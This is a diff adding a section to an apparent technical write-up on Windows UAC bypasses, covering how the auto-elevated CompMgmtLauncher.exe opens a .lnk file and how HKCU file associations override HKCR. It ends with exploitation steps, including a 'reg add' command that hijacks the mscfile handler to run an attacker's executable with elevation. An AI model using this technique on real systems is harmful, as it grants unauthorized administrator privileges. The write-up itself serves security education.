@@ -99,3 +99,56 @@ As can be seen, a child process will be created with [CreateProcessW](https://le
 
 The idea is that auto-elevated processes will spawn child processes with the same integrity level (at least by default, when using `CreateProcessW` as we've seen). A similar idea happens with the `ShellExecute(Ex)W\A` API, as we'll see soon.
 
+## HKCU and HKCR
+This code was taken from an old version of `CompMgmtLauncher.exe`, which was an auto-elevated executable:
+
+```c
+pwszLinkPath = L"Computer Management.lnk";
+if (tOsVer.wProductType == 1)
+{
+    bIsWorkstation = 1;
+}
+if (!bIsWorkstation)
+{
+    pwszLinkPath = L"Server Manager.lnk";
+}
+v3 = ResolveFullPath(wszFilePath, v0, pwszLinkPath);
+
+// ...
+
+tShlex.cbSize = 112;
+tShlex.lpFile = wszFilePath;
+tShlex.nShow = 5;
+tShlex.lpVerb = L"open";
+if (ShellExecuteExW(&tShlex))
+{
+    // Handle error
+}
+```
+
+This code calls the [ShellExecuteExW](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw) function to execute a child process, but this time to open a `lnk` file. This time we do not have environment variables to poison, but we can still poison the file association.  
+File associations are maintained in the registry, and specify the default program that opens the given file. The OS maintains a "global" file association saved in the `HKLM` registry hive, but users can change their own file association without affecting other users - this results in a change in the `HKCU` hive. File associations are maintained in the `HKCR` hive, which is a merge between `HKLM` and `HKCU`, with the latter taking precedence!  
+This is quite lucky since `HKLM` requires elevation to write to, but `HKCU` usually does not.  
+Back to our scenario - the given LNK files (`Computer Management.lnk` or `Server Manager.lnk`) point to a `.msc` file. We can see the default `.msc` file handler, even in `cmd`:
+
+```shell
+C:\>assoc .msc
+.msc=MSCFile
+
+C:\>ftype MSCfile
+MSCfile=%SystemRoot%\system32\mmc.exe "%1" %*
+```
+
+As you can see, `mmc.exe` is the handler for `.msc` files. A more direct approach can be taken by querying the registry:
+
+```shell
+C:\>reg query "HKCR\mscfile\shell\open\command"
+
+HKEY_CLASSES_ROOT\mscfile\shell\open\command
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\mmc.exe "%1" %*
+```
+
+According to our plan, we can change the file association of `mscfile` easily, therefore using a different handler. Exploitation steps:
+1. Run `reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_EXPAND_SZ /d "%temp%\my_evil_handler.exe" /f`.
+2. Run `CompMgmtLauncher.exe`.
+3. Delete the registry path under `HKCU` that we just created.
